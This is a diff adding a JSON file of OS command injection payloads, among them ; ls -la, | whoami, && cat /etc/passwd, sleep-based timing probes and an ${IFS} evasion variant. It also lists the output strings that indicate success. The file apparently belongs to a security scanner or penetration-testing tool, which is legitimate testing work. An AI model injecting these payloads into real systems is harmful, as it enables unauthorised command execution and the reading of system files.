@@ -1,0 +1,29 @@
+{
+  "payloads": [
+    "; ls -la",
+    "| whoami",
+    "&& cat /etc/passwd",
+    "`id`",
+    "$(whoami)",
+    "; ping -c 10 127.0.0.1",
+    "| sleep 5",
+    "&& sleep 5",
+    "; sleep 5 #",
+    "\n/bin/ls\n",
+    "`sleep 5`",
+    "test`echo test`",
+    ";${IFS}cat${IFS}/etc/passwd"
+  ],
+  "output_indicators": [
+    "uid=",
+    "gid=",
+    "groups=",
+    "root:x:",
+    "daemon:",
+    "total ",
+    "drwxr",
+    "bin",
+    "usr",
+    "etc"
+  ]
+}
